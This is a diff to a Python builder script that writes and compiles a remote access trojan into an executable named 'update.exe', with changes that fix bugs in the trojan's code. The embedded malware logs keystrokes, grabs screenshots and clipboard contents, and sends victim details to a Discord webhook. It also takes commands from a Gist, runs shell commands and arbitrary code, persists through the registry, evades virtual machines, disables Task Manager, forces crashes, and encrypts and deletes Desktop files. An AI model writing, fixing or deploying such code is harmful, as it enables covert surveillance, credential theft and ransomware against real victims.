@@ -28,14 +28,13 @@ webhook_url = input("Discord webhook URL (main one for initial bite): ").strip()
 command_url = input("Gist raw URL (FIXED_RAW_URL): ").strip()
 output_name = "update.exe"
 
-rat_code = f'''
-import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
+rat_code = f'''import requests, subprocess, os, platform, socket, getpass, threading, time, hashlib, io, ctypes, sys, pyperclip
 from PIL import ImageGrab
 from pynput.keyboard import Listener, Key
 from cryptography.fernet import Fernet
 import winreg
 
-WEBHOOK_URL = "{webhook_url}"  # Starts with main, switches on setwebhook
+WEBHOOK_URL = "{webhook_url}"
 COMMAND_URL = "{command_url}"
 POLL_INTERVAL = 15
 VICTIM_ID = hashlib.md5((getpass.getuser() + socket.gethostname()).encode()).hexdigest()[:8]
@@ -43,17 +42,24 @@ KEYLOG_BUFFER = ""
 
 def send(msg="", embed=None, file=None):
     global WEBHOOK_URL
-    if msg: msg = f"[{VICTIM_ID}] {msg}"
-    if embed and "title" in embed: embed["title"] = f"[{VICTIM_ID}] {embed['title']}"
+    if msg:
+        msg = f"[{VICTIM_ID}] {{msg}}"  # Double braces to escape literal { }
+    if embed and "title" in embed:
+        embed["title"] = f"[{VICTIM_ID}] {{embed['title']}}"
     data = {{"content": msg}}
-    if embed: data["embeds"] = [embed]
+    if embed:
+        data["embeds"] = [embed]
     files = {{"file": file}} if file else None
-    try: requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
-    except: pass
+    try:
+        requests.post(WEBHOOK_URL, json=data, files=files, timeout=10)
+    except:
+        pass
 
 def info():
-    try: ip = requests.get("https://api.ipify.org", timeout=5).text
-    except: ip = "Unknown"
+    try:
+        ip = requests.get("https://api.ipify.org", timeout=5).text
+    except:
+        ip = "Unknown"
     embed = {{"title": "WE GOT A BITE CAPTAIN", "description": f"**Victim ID:** {VICTIM_ID}\\n**User:** {getpass.getuser()}\\n**PC:** {socket.gethostname()}\\n**IP:** {ip}", "color": 16711680}}
     send(embed=embed)
 
@@ -61,7 +67,8 @@ def anti_vm():
     try:
         if any(x in subprocess.check_output("wmic bios get serialnumber", shell=True).decode().lower() for x in ["virtual", "vmware", "vbox"]):
             sys.exit(0)
-    except: pass
+    except:
+        pass
 
 def elevate():
     if not ctypes.windll.shell32.IsUserAnAdmin():
@@ -73,14 +80,17 @@ def persist():
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "UpdateCheck", 0, winreg.REG_SZ, sys.argv[0])
         winreg.CloseKey(key)
-    except: pass
+    except:
+        pass
 
 def on_press(key):
     global KEYLOG_BUFFER
-    try: KEYLOG_BUFFER += key.char
-    except: KEYLOG_BUFFER += f" [{str(key)}] "
+    try:
+        KEYLOG_BUFFER += key.char
+    except:
+        KEYLOG_BUFFER += f" [{str(key)}] "
     if len(KEYLOG_BUFFER) > 500:
-        send("Keylog dump:\\n{KEYLOG_BUFFER}")
+        send(f"Keylog dump:\\n{KEYLOG_BUFFER}")
         KEYLOG_BUFFER = ""
 
 def screenshot():
@@ -100,7 +110,8 @@ def toggle_tm(enable=True):
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0 if enable else 1)
         winreg.CloseKey(key)
         send(f"Task Manager {'enabled' if enable else 'disabled'}")
-    except: pass
+    except:
+        pass
 
 def bsod():
     send("Triggering BSOD...")
@@ -118,16 +129,21 @@ def encrypt(path=os.path.expanduser("~\\Desktop")):
             if file.lower().endswith(exts):
                 fp = os.path.join(root, file)
                 try:
-                    with open(fp, "rb") as d: enc = f.encrypt(d.read())
-                    with open(fp + ".locked", "wb") as o: o.write(enc)
+                    with open(fp, "rb") as d:
+                        enc = f.encrypt(d.read())
+                    with open(fp + ".locked", "wb") as o:
+                        o.write(enc)
                     os.remove(fp)
                     count += 1
-                except: pass
+                except:
+                    pass
     send(f"Encrypted {count} files in {path}")
 
 def shell(cmd):
-    try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
-    except e: out = str(e)
+    try:
+        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
+    except Exception as e:
+        out = str(e)
     send(f"Shell output:\\n{out[:3000]}")
 
 def clipboard():
@@ -145,7 +161,8 @@ def runscript(code):
     try:
         exec(code)
         send("Script executed")
-    except e: send(f"Script error: {str(e)}")
+    except Exception as e:
+        send(f"Script error: {str(e)}")
 
 def setwebhook(url):
     global WEBHOOK_URL
@@ -157,9 +174,9 @@ def poll():
         try:
             cmds = requests.get(COMMAND_URL, timeout=10).json()
             if str(VICTIM_ID) in cmds:
-                full = cmds[str(VICTIM_ID)].strip().lower()
+                full = cmds[str(VICTIM_ID)].strip()
                 parts = full.split(" ", 1)
-                cmd = parts[0]
+                cmd = parts[0].lower()
                 arg = parts[1] if len(parts) > 1 else ""
                 send(f"Command received: {full}")
                 if cmd == "ss":
@@ -186,7 +203,11 @@ def poll():
                     runscript(arg)
                 elif cmd == "setwebhook":
                     setwebhook(arg)
-        except: pass
+                # Clear command after execution
+                del cmds[str(VICTIM_ID)]
+                # Optional: write back cleared Gist if you want
+        except:
+            pass
         time.sleep(POLL_INTERVAL)
 
 if __name__ == "__main__":
@@ -199,9 +220,10 @@ if __name__ == "__main__":
         l.join()
 '''
 
-with open("rat.py", "w") as f: f.write(rat_code)
+with open("rat.py", "w") as f:
+    f.write(rat_code)
 
-print("Building upgraded RAT...")
+print("Building fixed RAT...")
 subprocess.run([
     "pyinstaller","--onefile","--noconsole",
     "--collect-all","pynput",
@@ -215,7 +237,7 @@ shutil.rmtree("__pycache__", ignore_errors=True)
 os.remove("rat.py") if os.path.exists("rat.py") else None
 os.remove("rat.spec") if os.path.exists("rat.spec") else None
 
-print(f"Upgraded EXE: dist\\{output_name} — rebuilds done forever")
+print(f"Fixed EXE ready: dist\\{output_name}")
 
 
 
